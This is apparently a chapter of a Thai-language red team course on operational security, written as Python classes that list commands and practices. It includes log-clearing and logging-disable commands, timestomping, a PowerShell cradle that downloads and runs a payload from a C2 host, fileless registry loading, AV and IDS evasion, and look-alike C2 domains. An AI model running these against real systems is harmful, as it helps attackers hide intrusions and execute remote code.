# Part 89: Operational Security - OPSEC (Steps 881-890)

## ภาพรวม
Operational Security (OPSEC) ในบริบทแองการทดสอบการเจาะระบบคือวิธีการปกป้องข้อมูลและพฤติกรรมของทีมไม่ให้ฝ่ายตรวจจับได้

---

## Step 881: OPSEC Fundamentals

หลักการ OPSEC สำหรับ Red Team Operations

```python
from dataclasses import dataclass, field
from typing import List, Dict
from enum import Enum

class OPSECRisk(Enum):
    CRITICAL = "Critical - Stops Operation"
    HIGH = "High - Exposes TTP"
    MEDIUM = "Medium - Reduces Effectiveness"
    LOW = "Low - Minor Exposure"

@dataclass
class OPSECViolation:
    category: str
    description: str
    risk: OPSECRisk
    mitigation: str
    examples: List[str]

class OPSECFramework:
    """OPSEC framework for Red Team operations"""
    
    # 5-step OPSEC process
    OPSEC_PROCESS = [
        "1. Identify Critical Information - What must be protected?",
        "2. Threat Analysis - Who is the adversary? What are their capabilities?",
        "3. Vulnerability Analysis - How can critical info be exposed?",
        "4. Risk Assessment - Likelihood x Impact",
        "5. Apply Countermeasures - Reduce risk to acceptable level"
    ]
    
    # Common OPSEC failures
    OPSEC_FAILURES = [
        OPSECViolation(
            category="Infrastructure",
            description="Using personal infrastructure or accounts",
            risk=OPSECRisk.CRITICAL,
            mitigation="Use dedicated, isolated infrastructure per operation",
            examples=["Testing from home IP", "Using personal GitHub", "Personal email for phishing"]
        ),
        OPSECViolation(
            category="Tooling",
            description="Using default tool configurations",
            risk=OPSECRisk.HIGH,
            mitigation="Customize all tools, change default ports/paths/certificates",
            examples=["Default Cobalt Strike malleable profile", "Default Metasploit ports",
                     "Default Burp Suite CA certificate"]
        ),
        OPSECViolation(
            category="Attribution",
            description="Reusing infrastructure across engagements",
            risk=OPSECRisk.HIGH,
            mitigation="New infrastructure per engagement, burn all IOCs after",
            examples=["Same C2 domain for multiple clients", "Same IP across engagements"]
        ),
        OPSECViolation(
            category="Digital Footprint",
            description="Leaving detectable artifacts during testing",
            risk=OPSECRisk.MEDIUM,
            mitigation="Clean up after every action, minimize footprint",
            examples=["Log files with team member names", "Timestomping not performed",
                     "Files left on target systems"]
        ),
        OPSECViolation(
            category="Communications",
            description="Insecure communications about the engagement",
            risk=OPSECRisk.MEDIUM,
            mitigation="Use encrypted channels, code words for sensitive topics",
            examples=["Discussing targets on Slack", "Email with client info unencrypted"]
        )
    ]
    
    def opsec_checklist(self, phase: str) -> List[str]:
        """OPSEC checklist by engagement phase"""
        checklists = {
            "pre_engagement": [
                "[ ] Dedicated team infrastructure provisioned",
                "[ ] VPN for all team members",
                "[ ] Communication channels encrypted (Signal/Wire)",
                "[ ] No personal accounts linked to engagement",
                "[ ] All tools customized (change defaults)",
                "[ ] Legal documentation signed and filed"
            ],
            "active": [
                "[ ] All traffic through VPN/redirectors",
                "[ ] No testing from personal IPs",
                "[ ] Minimize dwell time",
                "[ ] Clean up after each action",
                "[ ] Stay within scope boundaries",
                "[ ] Document every action with timestamps"
            ],
            "post_engagement": [
                "[ ] All persistence mechanisms removed",
                "[ ] Tools and implants removed from target",
                "[ ] All evidence of access cleaned up",
                "[ ] Infrastructure decommissioned",
                "[ ] Findings report encrypted for transit"
            ]
        }
        return checklists.get(phase, [])

if __name__ == '__main__':
    fw = OPSECFramework()
    print("OPSEC Process:")
    for step in fw.OPSEC_PROCESS:
        print(f"  {step}")
    print("\nCritical OPSEC Failures:")
    for failure in fw.OPSEC_FAILURES:
        if failure.risk in [OPSECRisk.CRITICAL, OPSECRisk.HIGH]:
            print(f"  [{failure.risk.name}] {failure.category}: {failure.description}")
    print("\nPre-Engagement OPSEC Checklist:")
    for item in fw.opsec_checklist('pre_engagement'):
        print(f"  {item}")
```

---

## Step 882: Infrastructure Isolation

การแยกโครงสร้าง Infrastructure สำหรับ OPSEC

```python
from typing import Dict, List

class InfrastructureIsolation:
    """Infrastructure isolation best practices"""
    
    def c2_infrastructure_design(self) -> Dict[str, List[str]]:
        """Tiered C2 infrastructure design"""
        return {
            "tier_1_redirectors": [
                "Short-lived IPs/domains (burn fast if detected)",
                "Geo-located near target (blends with traffic)",
                "Forward traffic to long-haul layer",
                "Apache/Nginx reverse proxy with filtering",
                "Kill switch to disable redirector remotely"
            ],
            "tier_2_long_haul": [
                "Long-lived infrastructure",
                "Never directly exposed to target",
                "Heavy obfuscation (domain fronting, CDN)",
                "Cloud provider (AWS, Azure, Cloudflare)"
            ],
            "tier_3_c2_servers": [
                "Never directly reachable from internet",
                "Accessible only from team VPN",
                "Cobalt Strike/Sliver team server here",
                "Full disk encryption"
            ]
        }
    
    def domain_categorization(self) -> Dict[str, str]:
        """Domain aging and categorization for C2"""
        return {
            "domain_age": "Purchase domains 30-90 days before use (avoid new domain alerts)",
            "categorization": (
                "Register domains with reputable categorization sites:\n"
                "- Bluecoat: sitereview.bluecoat.com\n"
                "- Cisco Talos: talosintelligence.com/reputation\n"
                "- Fortiguard: fortiguard.com/webfilter\n"
                "- McAfee: trustedsource.org"
            ),
            "good_categories": [
                "Technology", "Business", "Finance",
                "Healthcare", "Education"
            ],
            "domain_naming": [
                "Blend with legitimate traffic patterns",
                "Mimic CDN/analytics services: cdn-analytics[.]net",
                "Use typosquatting of trusted domains",
                "Use look-alike characters: paypa1[.]com"
            ]
        }
    
    def vps_opsec_setup(self) -> List[str]:
        """Secure VPS setup for operations"""
        return [
            "# Pay with cryptocurrency for anonymity",
            "# Use VPN/Tor for initial account creation",
            "# Use unique email per VPS (ProtonMail, Tutanota)",
            "",
            "# Initial hardening after provisioning:",
            "ssh-keygen -t ed25519 -C 'ops-key' -f ~/.ssh/ops_key",
            "# Disable password auth, use keys only",
            "sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config",
            "sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config",
            "systemctl restart sshd",
            "",
            "# Install firewall",
            "ufw default deny incoming",
            "ufw allow from TEAM_IP to any port 2222",
            "ufw allow from TEAM_IP to any port 443",
            "ufw enable",
            "",
            "# Full disk encryption setup:",
            "# Use VPS with LUKS/dm-crypt support or encrypt data at application level"
        ]
    
    def traffic_blending(self) -> Dict[str, str]:
        """Techniques to blend C2 traffic"""
        return {
            "https_profile": "Use custom Cobalt Strike malleable C2 profile mimicking legitimate traffic",
            "domain_fronting": "Route traffic through CDN (Cloudflare/AWS CloudFront) to hide real C2",
            "dns_c2": "Encode data in DNS queries/responses (bypasses HTTP inspection)",
            "legitimate_services": "Use Slack API, Dropbox, GitHub as C2 channels",
            "steganography": "Hide data in images (LSB steganography) for exfil",
            "jitter_timing": "Randomize beacon timing (sleep + jitter) to avoid pattern detection"
        }

if __name__ == '__main__':
    infra = InfrastructureIsolation()
    print("C2 Infrastructure Design:")
    for tier, items in infra.c2_infrastructure_design().items():
        print(f"\n  {tier.upper()}:")
        for item in items:
            print(f"    - {item}")
    print("\nDomain Categorization Strategy:")
    cat_info = infra.domain_categorization()
    print(f"  Domain Age: {cat_info['domain_age']}")
    print(f"  Good Categories: {', '.join(cat_info['good_categories'])}")
```

---

## Step 883: Anti-Forensics for OPSEC

เทคนิคลบร่องรอย digital evidence

```python
import os
import time
from typing import List, Dict

class AntiForensicsOPSEC:
    """Anti-forensics techniques for OPSEC"""
    
    def log_clearing_windows(self) -> Dict[str, str]:
        """Windows log clearing commands"""
        return {
            "clear_event_logs": (
                "# Clear all Windows Event Logs\n"
                'wevtutil cl System\nwevtutil cl Security\nwevtutil cl Application\n'
                "# PowerShell:\n"
                "Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }"
            ),
            "clear_specific_logs": (
                "# Clear specific log types\n"
                "wevtutil cl 'Microsoft-Windows-PowerShell/Operational'\n"
                "wevtutil cl 'Microsoft-Windows-Sysmon/Operational'\n"
                "wevtutil cl 'Microsoft-Windows-Windows Defender/Operational'"
            ),
            "disable_logging_ps": (
                "# Disable PowerShell Script Block Logging\n"
                "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 0"
            ),
            "command_history": (
                "# Clear PowerShell history\n"
                "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue\n"
                "# Clear cmd history (in-memory only)\n"
                "doskey /reinstall"
            )
        }
    
    def log_clearing_linux(self) -> List[str]:
        """Linux log clearing commands"""
        return [
            "# Clear authentication logs",
            "echo '' > /var/log/auth.log",
            "echo '' > /var/log/secure",
            "",
            "# Clear bash history for current session",
            "history -c && history -w",
            "unset HISTFILE",
            "export HISTSIZE=0",
            "",
            "# Clear specific logs",
            "truncate -s 0 /var/log/syslog",
            "truncate -s 0 /var/log/messages",
            "truncate -s 0 /var/log/apache2/access.log",
            "",
            "# Remove files securely (DoD 7-pass wipe)",
            "shred -vzu -n 7 /tmp/malware.elf",
            "",
            "# Wipe free space (covers deleted files)",
            "dd if=/dev/urandom of=/tmp/wipe.tmp bs=1M",
            "rm /tmp/wipe.tmp"
        ]
    
    def timestomping(self, file_path: str) -> str:
        """Change file timestamps to avoid timeline analysis"""
        return f"""
# Linux timestomping using touch
# Match timestamps of a legitimate file
REF_FILE="/etc/hosts"
touch -r $REF_FILE {file_path}

# Set specific timestamps
touch -t 202301011200.00 {file_path}

# Python timestomping
import os
ref_stat = os.stat('/etc/hosts')
os.utime('{file_path}', (ref_stat.st_atime, ref_stat.st_mtime))

# Windows (PowerShell):
$file = Get-Item "{file_path}"
$file.LastWriteTime = Get-Date "2023-01-01 12:00:00"
$file.LastAccessTime = Get-Date "2023-01-01 12:00:00"
$file.CreationTime = Get-Date "2023-01-01 12:00:00"
        """
    
    def memory_only_execution(self) -> Dict[str, str]:
        """Techniques for memory-only execution (no disk artifacts)"""
        return {
            "powershell_cradle": (
                "# Download and execute entirely in memory\n"
                "IEX (New-Object Net.WebClient).DownloadString('https://c2/payload.ps1')"
            ),
            "reflective_dll": (
                "# Reflective DLL injection - loads DLL directly from memory\n"
                "Invoke-ReflectivePEInjection -PEBytes $shellcode -ForceASLR"
            ),
            "process_hollowing": (
                "# Process hollowing - hollow out legitimate process\n"
                "# Replace image of svchost.exe with malicious code"
            ),
            "fileless_registry": (
                "# Store payload in registry, execute from there\n"
                "reg add HKCU\\Software\\Update /v Payload /t REG_BINARY /d 'BASE64_PAYLOAD'\n"
                "# PowerShell reads and executes from registry\n"
                "$payload = (Get-ItemProperty HKCU:\\Software\\Update).Payload\n"
                "[System.Reflection.Assembly]::Load($payload)"
            )
        }

if __name__ == '__main__':
    anti_forensics = AntiForensicsOPSEC()
    print("Windows Log Clearing:")
    for action, cmd in anti_forensics.log_clearing_windows().items():
        print(f"  {action}: {cmd[:80]}...")
    print("\nMemory-Only Execution Techniques:")
    for tech, cmd in anti_forensics.memory_only_execution().items():
        print(f"  {tech}: {cmd[:80]}...")
```

---

## Step 884: Network OPSEC

การป้องกันการตรวจจับผ่านเครือข่าย

```python
from typing import Dict, List

class NetworkOPSEC:
    """Network-level OPSEC controls"""
    
    def vpn_chain_setup(self) -> List[str]:
        """Multi-hop VPN for anonymity"""
        return [
            "# Method 1: VPN chaining (nested VPNs)",
            "# Your IP -> VPN1 (Country A) -> VPN2 (Country B) -> Target",
            "",
            "# Method 2: SSH tunnel through jump host",
            "ssh -D 1080 -N -f jumphost  # SOCKS5 proxy via SSH",
            "ssh -L 8888:target:80 jumphost  # Local port forward",
            "",
            "# Method 3: Tor (slower but anonymous)",
            "torsocks curl https://target.com",
            "proxychains4 nmap -sT target.com",
            "",
            "# Method 4: ProxyChains configuration",
            "# /etc/proxychains4.conf:",
            "# strict_chain",
            "# proxy_dns",
            "# [ProxyList]",
            "# socks5  127.0.0.1  9050  # Tor",
            "# socks5  10.10.10.1  1080  # VPN SOCKS"
        ]
    
    def scan_signatures_evasion(self) -> Dict[str, str]:
        """Avoid detection signatures during scanning"""
        return {
            "slow_scan": (
                "# Nmap timing - slow scan to avoid IDS\n"
                "nmap -T0 -sS --max-rate 1 --scan-delay 5s target.com\n"
                "# T0 = Paranoid (very slow), T1 = Sneaky"
            ),
            "fragmented_packets": (
                "# Fragment packets to bypass signature matching\n"
                "nmap -f --mtu 8 target.com  # 8-byte fragments"
            ),
            "decoy_scan": (
                "# Use decoys to hide real scanner IP\n"
                "nmap -D RND:10 target.com  # 10 random decoys"
            ),
            "source_port_spoofing": (
                "# Use trusted source ports (DNS=53, HTTP=80)\n"
                "nmap --source-port 53 target.com"
            ),
            "ssl_inspection_bypass": (
                "# Domain fronting to bypass SSL inspection\n"
                "# Connect to allowed CDN, route to actual C2"
            )
        }
    
    def dns_opsec(self) -> Dict[str, str]:
        """DNS operational security"""
        return {
            "dns_over_https": (
                "# Use DoH to encrypt DNS queries\n"
                "curl -H 'accept: application/dns-json' "
                "'https://cloudflare-dns.com/dns-query?name=target.com&type=A'"
            ),
            "dns_leaks": (
                "# Check for DNS leaks when using VPN\n"
                "curl https://dnsleaktest.com/test.json"
            ),
            "private_dns": [
                "Use encrypted DNS (DoH/DoT)",
                "Route all DNS through VPN tunnel",
                "Disable mDNS/LLMNR (potential leaks)",
                "Use 1.1.1.1 (Cloudflare) or 9.9.9.9 (Quad9)"
            ]
        }
    
    def traffic_monitoring_evasion(self) -> List[str]:
        """Evade network traffic monitoring"""
        return [
            "Keep connection counts low (avoid port scans of entire subnets)",
            "Space out requests over time (jitter)",
            "Stay under bandwidth thresholds that trigger alerts",
            "Use legitimate-looking protocols (HTTPS, DNS) for C2",
            "Blend with normal business hours traffic patterns",
            "Avoid unusual TLS fingerprints (JA3 fingerprinting)",
            "Use existing legitimate connections when possible (living off the land)"
        ]

if __name__ == '__main__':
    net_opsec = NetworkOPSEC()
    print("VPN Chain Setup:")
    for line in net_opsec.vpn_chain_setup():
        if line:
            print(f"  {line}")
    print("\nScan Signature Evasion:")
    for tech, cmd in net_opsec.scan_signatures_evasion().items():
        print(f"  {tech}: {cmd[:80]}...")
    print("\nTraffic Monitoring Evasion:")
    for item in net_opsec.traffic_monitoring_evasion():
        print(f"  - {item}")
```

---

## Step 885: Malware OPSEC

OPSEC ในการสร้างและใช้งาน malware

```python
from typing import Dict, List

class MalwareOPSEC:
    """OPSEC considerations for custom malware"""
    
    def compile_opsec(self) -> Dict[str, str]:
        """Compilation-time OPSEC"""
        return {
            "strip_debug_info": (
                "# Strip debug symbols (no function names in binary)\n"
                "strip --strip-debug --strip-unneeded malware.elf  # Linux\n"
                "# MSVC: /DEBUG:NONE  # Windows"
            ),
            "pdb_removal": (
                "# Remove PDB path from PE binary (reveals source structure)\n"
                "# Use /PDBALTPATH in MSVC linker\n"
                "# Or strip with objcopy: objcopy --strip-all malware.exe"
            ),
            "compilation_env": (
                "# Compile in clean environment\n"
                "# Use Docker container without real user info\n"
                "docker run --rm -v $(pwd):/code compiler-image sh -c 'cd /code && make'"
            ),
            "strings_sanitization": (
                "# Remove identifying strings before compilation\n"
                "# No developer names, company names, paths\n"
                "# Use obfuscated strings (XOR, AES encrypted)"
            ),
            "timestamp_manipulation": (
                "# PE header timestamp can reveal compilation time\n"
                "# Change with pe-bear or manually patch\n"
                "# Match legitimate software timestamps"
            )
        }
    
    def signature_evasion_opsec(self) -> List[str]:
        """Avoid signature detection"""
        return [
            "Test against multiple AV engines before deployment (VirusTotal alternative)",
            "Use offline AV testing tools (ThreatCheck, DefenderCheck)",
            "Never upload test samples to VirusTotal (feeds threat intel)",
            "Use custom packer/obfuscator for each engagement",
            "Sign binaries with legitimate code signing cert if possible",
            "Test in environment matching target (same AV product)",
            "Monitor AV detection rates and regenerate if detected"
        ]
    
    def c2_callback_opsec(self) -> Dict[str, str]:
        """C2 callback OPSEC"""
        return {
            "working_hours": (
                "# Only beacon during business hours (8am-6pm target timezone)\n"
                "# Cobalt Strike sleep management:\n"
                "sleep 14400  # 4 hour sleep during off-hours"
            ),
            "sleep_jitter": (
                "# Add randomness to beacon timing\n"
                "# Cobalt Strike: sleep 300 50  (300s +/- 50%)\n"
                "import random, time\n"
                "base_sleep = 300\n"
                "jitter = random.uniform(0.7, 1.3)\n"
                "time.sleep(base_sleep * jitter)"
            ),
            "payload_staging": (
                "# Use staged payload - small stager downloads main payload\n"
                "# Reduces initial detection footprint\n"
                "# Stage 1: Check environment, download Stage 2\n"
                "# Stage 2: Main implant with C2 capability"
            ),
            "killdate": (
                "# Build in kill date - implant stops working after date\n"
                "from datetime import datetime\n"
                "if datetime.now() > datetime(2024, 12, 31):\n"
                "    sys.exit(0)  # Self-terminate\n"
                "# Prevents lingering implants after engagement ends"
            )
        }

if __name__ == '__main__':
    mal_opsec = MalwareOPSEC()
    print("Compilation OPSEC:")
    for tech, desc in mal_opsec.compile_opsec().items():
        print(f"  {tech}: {desc[:80]}...")
    print("\nSignature Evasion OPSEC:")
    for item in mal_opsec.signature_evasion_opsec():
        print(f"  - {item}")
    print("\nC2 Callback OPSEC:")
    for tech, desc in mal_opsec.c2_callback_opsec().items():
        print(f"  {tech}: {desc[:80]}...")
```

---

## Steps 886-890: OPSEC Continued

```python
# Steps 886-890 cover advanced OPSEC topics:

class AdvancedOPSEC:
    """Advanced OPSEC topics - Steps 886-890"""
    
    # Step 886: Team communication security
    TEAM_COMMS_SECURITY = {
        "apps": ["Signal (end-to-end encrypted)", "Wire (E2E, no phone number)", 
                 "Element/Matrix (federated E2E)"],
        "operational_security": [
            "Use code words for client names",
            "Never discuss operations on personal channels",
            "Disappearing messages enabled",
            "Verify contacts via safety numbers"
        ],
        "file_sharing": [
            "OnionShare for anonymous file transfers",
            "Use PGP-encrypted email for reports",
            "Self-hosted file sharing (Nextcloud)"
        ]
    }
    
    # Step 887: Identity management
    IDENTITY_MANAGEMENT = {
        "personas": [
            "Create separate personas for phishing campaigns",
            "Different email, LinkedIn, phone for each persona",
            "Age account 30+ days before use",
            "Build realistic backstory"
        ],
        "accounts": [
            "Separate GitHub account for PoC research",
            "No real name in any operational account",
            "Use password manager with strong unique passwords",
            "MFA on all operational accounts"
        ]
    }
    
    # Step 888: Scope boundary OPSEC
    SCOPE_MANAGEMENT = [
        "Always maintain written copy of scope document",
        "Double-check IP ownership before scanning",
        "Use RFC 5737 documentation ranges for examples in reports",
        "Emergency stop procedures documented and rehearsed",
        "Out-of-scope systems: immediately stop and notify"
    ]
    
    # Step 889: Evidence handling
    EVIDENCE_HANDLING = {
        "screenshot_metadata": (
            "Remove EXIF data from screenshots:\n"
            "exiftool -all= screenshot.png\n"
            "# Or use tools that don't embed metadata"
        ),
        "log_retention": (
            "Keep detailed operational logs (for report and legal protection)\n"
            "Encrypt all logs with client-specific key\n"
            "Separate storage from attack infrastructure"
        ),
        "data_destruction": (
            "After engagement: destroy operational data per data handling policy\n"
            "Overwrite VPS disks before destroying instance\n"
            "shred -vzu -n 3 all_evidence/*.log"
        )
    }
    
    # Step 890: Legal documentation
    LEGAL_DOCS = [
        "Statement of Work (SoW) signed before start",
        "Rules of Engagement (RoE) document",
        "Get Out of Jail Free letter from client",
        "Emergency contact list (client CISO/SOC)",
        "Bug bounty program terms and conditions",
        "NDA signed with client"
    ]
    
    def generate_roe_template(self) -> str:
        """Rules of Engagement template"""
        return """
## Rules of Engagement

### Test Window
- Start: [DATE/TIME with timezone]
- End: [DATE/TIME with timezone]
- Testing Hours: [Hours or 24x7]

### Scope
- In Scope: [List of IPs, domains, systems]
- Out of Scope: [Explicit exclusions]
- Cloud Resources: [Specify if included]

### Authorized Techniques
- [ ] Scanning/enumeration
- [ ] Exploitation
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Exfiltration (simulated only)
- [ ] Physical testing
- [ ] Social engineering

### Emergency Contacts
- Client Security Lead: [Name, Phone, Email]
- Client SOC: [Phone]
- Red Team Lead: [Name, Phone]

### Notification Requirements
- Notify if critical system impact expected
- Notify if ransomware-like behavior needed
- 24-hour notification for social engineering
        """

if __name__ == '__main__':
    opsec = AdvancedOPSEC()
    print("Team Communication Security:")
    for app in opsec.TEAM_COMMS_SECURITY['apps']:
        print(f"  Recommended: {app}")
    print("\nScope Management OPSEC:")
    for item in opsec.SCOPE_MANAGEMENT:
        print(f"  [ ] {item}")
    print("\nLegal Documentation:")
    for doc in opsec.LEGAL_DOCS:
        print(f"  - {doc}")
    print("\nRules of Engagement Template:")
    print(opsec.generate_roe_template()[:400])
```

---

## สรุป Part 89

1. **Step 881**: OPSEC fundamentals - 5-step process, failure categories
2. **Step 882**: Infrastructure isolation - tiered C2, domain aging, VPS setup
3. **Step 883**: Anti-forensics - log clearing, timestomping, memory execution
4. **Step 884**: Network OPSEC - VPN chains, scan evasion, DNS security
5. **Step 885**: Malware OPSEC - compilation security, callback timing
6. **Step 886**: Team communication security - Signal, Wire, code words
7. **Step 887**: Identity management - personas, account separation
8. **Step 888**: Scope boundary management - documentation, emergency stops
9. **Step 889**: Evidence handling - metadata removal, log encryption
10. **Step 890**: Legal documentation - RoE template, emergency contacts

**หลักการสำคัญ**: OPSEC เริ่มต้นก่อน operation - ไม่ใช่หลังจากถูกตรวจจับ
